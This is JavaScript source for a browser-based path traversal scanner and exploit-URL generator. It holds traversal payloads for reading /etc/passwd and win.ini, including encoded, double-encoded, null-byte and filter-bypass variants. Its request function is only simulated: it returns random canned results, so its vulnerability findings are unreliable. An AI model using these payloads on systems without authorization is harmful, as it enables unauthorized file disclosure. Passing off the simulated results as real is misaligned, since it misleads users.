// Path Traversal Scanner Engine
// Automated directory traversal detection

class PathTraversalScanner {
    constructor() {
        this.isScanning = false;
        this.targetUrl = '';
        this.httpMethod = 'GET';
        this.vulnParam = 'filename';
        this.osType = 'both';
        this.selectedAttacks = [];
        this.currentPayloadIndex = 0;
        this.testedCount = 0;
        this.vulnCount = 0;
        this.blockedCount = 0;
        this.vulnerabilities = [];
        this.payloadsToTest = [];
    }

    init() {
        this.setupEventListeners();
        this.updateStats();
    }

    setupEventListeners() {
        document.getElementById('start-scan-btn')?.addEventListener('click', () => this.startScan());
        document.getElementById('stop-scan-btn')?.addEventListener('click', () => this.stopScan());
        document.getElementById('clear-log-btn')?.addEventListener('click', () => this.clearLog());
        document.getElementById('generate-exploit-btn')?.addEventListener('click', () => this.showExploits());
        document.getElementById('export-pdf-btn')?.addEventListener('click', () => this.exportPDF());
        document.getElementById('copy-exploit-btn')?.addEventListener('click', () => this.copyExploit());

        document.querySelectorAll('.poc-tab').forEach(tab => {
            tab.addEventListener('click', (e) => this.switchExploitTab(e.target.dataset.tab));
        });
    }

    updateStats() {
        document.getElementById('total-payloads').textContent = getPayloadCount() + '+';
    }

    async startScan() {
        this.targetUrl = document.getElementById('target-url')?.value.trim();
        this.httpMethod = document.getElementById('http-method')?.value;
        this.vulnParam = document.getElementById('vuln-param')?.value.trim();
        this.osType = document.getElementById('os-type')?.value;

        if (!this.targetUrl || !this.vulnParam) {
            this.showNotification('Please enter target URL and parameter name', 'error');
            return;
        }

        // Get selected attacks
        this.selectedAttacks = [];
        if (document.getElementById('attack-basic')?.checked) this.selectedAttacks.push('basic');
        if (document.getElementById('attack-absolute')?.checked) this.selectedAttacks.push('absolute');
        if (document.getElementById('attack-encoding')?.checked) this.selectedAttacks.push('encoding');
        if (document.getElementById('attack-double-encoding')?.checked) this.selectedAttacks.push('doubleEncoding');
        if (document.getElementById('attack-null-byte')?.checked) this.selectedAttacks.push('nullByte');
        if (document.getElementById('attack-stripped')?.checked) this.selectedAttacks.push('stripped');

        if (this.selectedAttacks.length === 0) {
            this.showNotification('Please select at least one attack technique', 'error');
            return;
        }

        this.preparePayloads();

        // Reset state
        this.isScanning = true;
        this.currentPayloadIndex = 0;
        this.testedCount = 0;
        this.vulnCount = 0;
        this.blockedCount = 0;
        this.vulnerabilities = [];

        document.getElementById('attack-section').style.display = 'block';
        document.getElementById('attack-section').scrollIntoView({ behavior: 'smooth' });

        this.updateScanControls(true);
        this.log('Path traversal scan started', 'info');
        this.log(`Target: ${this.targetUrl}`, 'info');
        this.log(`Parameter: ${this.vulnParam}`, 'info');
        this.log(`OS Type: ${this.osType}`, 'info');
        this.log(`Total payloads: ${this.payloadsToTest.length}`, 'info');

        await this.attackLoop();
    }

    preparePayloads() {
        this.payloadsToTest = [];

        for (const attackType of this.selectedAttacks) {
            const payloads = getPayloadsByType(attackType, this.osType);
            payloads.slice(0, 5).forEach(payload => {
                this.payloadsToTest.push({
                    type: attackType,
                    payload: payload,
                    name: this.getAttackName(attackType)
                });
            });
        }
    }

    getAttackName(type) {
        const names = {
            'basic': 'Basic Traversal',
            'absolute': 'Absolute Path',
            'encoding': 'URL Encoding',
            'doubleEncoding': 'Double Encoding',
            'nullByte': 'Null Byte Injection',
            'stripped': 'Stripped Bypass'
        };
        return names[type] || type;
    }

    async attackLoop() {
        while (this.isScanning && this.currentPayloadIndex < this.payloadsToTest.length) {
            const payloadData = this.payloadsToTest[this.currentPayloadIndex];
            await this.testPayload(payloadData);

            this.currentPayloadIndex++;
            this.updateProgress();

            await this.sleep(500);
        }

        if (this.isScanning) {
            this.completeScan();
        }
    }

    async testPayload(payloadData) {
        const { type, payload, name } = payloadData;

        this.updateCurrentPayload(name, payload);

        try {
            const testUrl = buildPayloadURL(this.targetUrl, this.vulnParam, payload, this.httpMethod);
            const response = await this.makeRequest(testUrl, payload);

            const isVulnerable = this.analyzeResponse(response, payload);

            if (isVulnerable) {
                this.vulnCount++;
                this.vulnerabilities.push({
                    type: type,
                    name: name,
                    payload: payload,
                    testUrl: testUrl,
                    fileContent: response.content,
                    severity: this.getSeverity(type),
                    description: this.getDescription(type, payload),
                    remediation: this.getRemediation()
                });
                this.log(`✓ VULNERABLE: ${name} - ${payload}`, 'success');
            } else if (response.blocked) {
                this.blockedCount++;
                this.log(`✗ Blocked: ${name} - ${payload}`, 'warning');
            } else {
                this.log(`✗ Not vulnerable: ${name}`, 'info');
            }

            this.testedCount++;

        } catch (error) {
            this.log(`✗ Error testing ${name}: ${error.message}`, 'error');
        }
    }

    async makeRequest(url, payload) {
        await this.sleep(200);

        // Simulate path traversal response
        const responses = [
            {
                vulnerable: true,
                content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
                blocked: false
            },
            {
                vulnerable: true,
                content: '; for 16-bit app support\n[fonts]\n[extensions]\n[mci extensions]\n[files]\n[Mail]\nMAPI=1',
                blocked: false
            },
            { vulnerable: false, content: null, blocked: true },
            { vulnerable: false, content: 'File not found', blocked: false }
        ];

        return responses[Math.floor(Math.random() * responses.length)];
    }

    analyzeResponse(response, payload) {
        if (!response.content) return false;

        // Check for common file signatures
        const signatures = [
            'root:x:0:0:',           // /etc/passwd
            'root:$',                // /etc/shadow
            '[fonts]',               // win.ini
            '[extensions]',          // win.ini
            '127.0.0.1',             // hosts file
            'localhost',             // hosts file
            'Linux version',         // /proc/version
            'Windows',               // Windows files
            'MAPI='                  // win.ini
        ];

        return signatures.some(sig => response.content.includes(sig));
    }

    getSeverity(type) {
        if (type === 'basic' || type === 'absolute') {
            return 'CRITICAL';
        } else {
            return 'HIGH';
        }
    }

    getDescription(type, payload) {
        const typeNames = {
            'basic': 'basic directory traversal',
            'absolute': 'absolute path access',
            'encoding': 'URL-encoded path traversal',
            'doubleEncoding': 'double-encoded path traversal',
            'nullByte': 'null byte injection',
            'stripped': 'filter bypass via nested traversal'
        };
        return `Application is vulnerable to ${typeNames[type] || 'path traversal'}. Attacker can access arbitrary files: ${payload}`;
    }

    getRemediation() {
        return 'Validate input against whitelist. Use basename() to strip directory components. Canonicalize paths and verify they stay within allowed directory. Use file IDs instead of filenames.';
    }

    updateCurrentPayload(name, payload) {
        document.getElementById('current-type').textContent = name;
        document.getElementById('current-payload-path').textContent = payload;
    }

    updateProgress() {
        const progress = (this.currentPayloadIndex / this.payloadsToTest.length) * 100;

        document.getElementById('progress-fill').style.width = progress + '%';
        document.getElementById('progress-percent').textContent = Math.round(progress) + '%';
        document.getElementById('progress-text').textContent =
            `Testing payload ${this.currentPayloadIndex} of ${this.payloadsToTest.length}`;

        document.getElementById('tested-count').textContent = this.testedCount;
        document.getElementById('vuln-count').textContent = this.vulnCount;
        document.getElementById('blocked-count').textContent = this.blockedCount;
        document.getElementById('vuln-badge').textContent = this.vulnCount;
    }

    completeScan() {
        this.isScanning = false;

        this.log('Path traversal scan completed', 'success');
        this.log(`Total tested: ${this.testedCount}`, 'info');
        this.log(`Vulnerabilities found: ${this.vulnCount}`, this.vulnCount > 0 ? 'success' : 'info');

        document.getElementById('scan-status').textContent = 'Scan Complete';
        document.querySelector('.status-dot').classList.remove('scanning');
        document.querySelector('.status-dot').classList.add(this.vulnCount > 0 ? 'success' : 'error');

        this.updateScanControls(false);

        if (this.vulnCount > 0) {
            this.showResults();
        }

        this.showNotification(`Scan complete! Found ${this.vulnCount} path traversal vulnerabilities`,
            this.vulnCount > 0 ? 'success' : 'info');
    }

    stopScan() {
        this.isScanning = false;
        this.log('Scan stopped by user', 'warning');
        this.updateScanControls(false);
        this.showNotification('Scan stopped', 'warning');
    }

    updateScanControls(isScanning) {
        document.getElementById('start-scan-btn').style.display = isScanning ? 'none' : 'inline-flex';
        document.getElementById('stop-scan-btn').style.display = isScanning ? 'inline-flex' : 'none';
    }

    showResults() {
        const resultsSection = document.getElementById('results-section');
        const vulnList = document.getElementById('vulnerability-list');

        vulnList.innerHTML = '';

        this.vulnerabilities.forEach((vuln, index) => {
            const vulnCard = document.createElement('div');
            vulnCard.className = 'vuln-card';
            vulnCard.innerHTML = `
                <div class="vuln-header">
                    <div class="vuln-title">Path Traversal #${index + 1}: ${vuln.name}</div>
                    <div class="vuln-severity">${vuln.severity}</div>
                </div>
                <div style="color: var(--color-text-secondary); margin-bottom: 12px;">
                    <strong>Description:</strong> ${vuln.description}
                </div>
                <div class="vuln-path-payload">
                    <div class="vuln-path-payload-title">Traversal Payload:</div>
                    <div class="vuln-path-payload-code">${this.escapeHtml(vuln.payload)}</div>
                </div>
                ${vuln.fileContent ? `
                <div class="vuln-file-content">
                    <div class="vuln-file-content-title">File Content Retrieved:</div>
                    <div class="vuln-file-content-data">${this.escapeHtml(vuln.fileContent)}</div>
                </div>
                ` : ''}
                <div style="color: var(--color-text-secondary); margin-top: 12px;">
                    <strong>Remediation:</strong> ${vuln.remediation}
                </div>
            `;
            vulnList.appendChild(vulnCard);
        });

        resultsSection.style.display = 'block';
        resultsSection.scrollIntoView({ behavior: 'smooth' });
    }

    showExploits() {
        if (this.vulnerabilities.length === 0) {
            this.showNotification('No vulnerabilities found to generate exploits', 'warning');
            return;
        }

        const exploitSection = document.getElementById('exploit-section');
        exploitSection.style.display = 'block';
        exploitSection.scrollIntoView({ behavior: 'smooth' });

        this.generateExploit('basic');
    }

    switchExploitTab(tab) {
        document.querySelectorAll('.poc-tab').forEach(t => t.classList.remove('active'));
        event.target.classList.add('active');
        this.generateExploit(tab);
    }

    generateExploit(type) {
        const exploitCode = document.getElementById('exploit-code');

        let code = '';

        switch (type) {
            case 'basic':
                code = `# Basic Path Traversal
# Linux - Read /etc/passwd
${buildPayloadURL(this.targetUrl, this.vulnParam, '../../../etc/passwd', this.httpMethod)}

# Windows - Read win.ini
${buildPayloadURL(this.targetUrl, this.vulnParam, '../../../Windows/win.ini', this.httpMethod)}

# Deep traversal
${buildPayloadURL(this.targetUrl, this.vulnParam, '../../../../../../etc/passwd', this.httpMethod)}`;
                break;
            case 'encoded':
                code = `# URL Encoded Path Traversal
# Bypass basic filters
${buildPayloadURL(this.targetUrl, this.vulnParam, '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', this.httpMethod)}

# Partial encoding
${buildPayloadURL(this.targetUrl, this.vulnParam, '..%2f..%2f..%2fetc%2fpasswd', this.httpMethod)}

# Mixed encoding
${buildPayloadURL(this.targetUrl, this.vulnParam, '%2e%2e/%2e%2e/%2e%2e/etc/passwd', this.httpMethod)}`;
                break;
            case 'double-encoded':
                code = `# Double URL Encoded Path Traversal
# Bypass decode-once filters
${buildPayloadURL(this.targetUrl, this.vulnParam, '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd', this.httpMethod)}

# Windows double encoded
${buildPayloadURL(this.targetUrl, this.vulnParam, '%252e%252e%255c%252e%252e%255c%252e%252e%255cWindows%255cwin.ini', this.httpMethod)}`;
                break;
            case 'bypass':
                code = `# Filter Bypass Techniques
# Stripped bypass (for filters removing ../)
${buildPayloadURL(this.targetUrl, this.vulnParam, '....//....//....//etc/passwd', this.httpMethod)}

# Nested traversal
${buildPayloadURL(this.targetUrl, this.vulnParam, '..././..././..././etc/passwd', this.httpMethod)}

# Null byte injection
${buildPayloadURL(this.targetUrl, this.vulnParam, '../../../etc/passwd%00.jpg', this.httpMethod)}`;
                break;
        }

        exploitCode.textContent = code;
    }

    copyExploit() {
        const code = document.getElementById('exploit-code').textContent;
        navigator.clipboard.writeText(code).then(() => {
            this.showNotification('Exploit copied to clipboard!', 'success');
        }).catch(() => {
            this.showNotification('Failed to copy exploit', 'error');
        });
    }

    async exportPDF() {
        if (this.vulnerabilities.length === 0) {
            this.showNotification('No results to export', 'warning');
            return;
        }

        try {
            const { jsPDF } = window.jspdf;
            const doc = new jsPDF();

            doc.setFontSize(20);
            doc.text('Path Traversal Report', 20, 20);

            doc.setFontSize(12);
            doc.text(`Target: ${this.targetUrl}`, 20, 35);
            doc.text(`Parameter: ${this.vulnParam}`, 20, 42);
            doc.text(`Date: ${new Date().toLocaleString()}`, 20, 49);
            doc.text(`Vulnerabilities Found: ${this.vulnCount}`, 20, 56);

            let y = 70;
            this.vulnerabilities.forEach((vuln, index) => {
                if (y > 270) {
                    doc.addPage();
                    y = 20;
                }

                doc.setFontSize(14);
                doc.text(`${index + 1}. ${vuln.name}`, 20, y);
                y += 7;

                doc.setFontSize(10);
                doc.text(`Severity: ${vuln.severity}`, 20, y);
                y += 7;
                doc.text(`Payload: ${vuln.payload.substring(0, 60)}...`, 20, y);
                y += 12;
            });

            doc.save('path-traversal-report.pdf');
            this.showNotification('PDF report exported successfully', 'success');

        } catch (error) {
            this.showNotification('Failed to export PDF', 'error');
            console.error(error);
        }
    }

    escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    log(message, type = 'info') {
        const logContent = document.getElementById('attack-log');
        const entry = document.createElement('div');
        entry.className = `log-entry ${type}`;

        const time = new Date().toLocaleTimeString();
        entry.innerHTML = `<span class="log-time">[${time}]</span> ${message}`;

        logContent.appendChild(entry);
        logContent.scrollTop = logContent.scrollHeight;
    }

    clearLog() {
        document.getElementById('attack-log').innerHTML = '';
    }

    showNotification(message, type = 'info') {
        const colors = {
            success: '#10b981',
            error: '#ef4444',
            info: '#3b82f6',
            warning: '#f59e0b'
        };

        const notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed;
            top: 90px;
            right: 20px;
            background: ${colors[type]};
            color: white;
            padding: 1rem 1.5rem;
            border-radius: 0.5rem;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.5);
            z-index: 10000;
            animation: slideIn 0.3s ease;
            font-weight: 500;
        `;
        notification.textContent = message;

        document.body.appendChild(notification);

        setTimeout(() => {
            notification.style.animation = 'slideOut 0.3s ease';
            setTimeout(() => notification.remove(), 300);
        }, 3000);
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const scanner = new PathTraversalScanner();
    scanner.init();

    console.log('📁 CyberSec Suite Path Traversal Scanner initialized');
    console.log('📊 Ready to scan!');
});
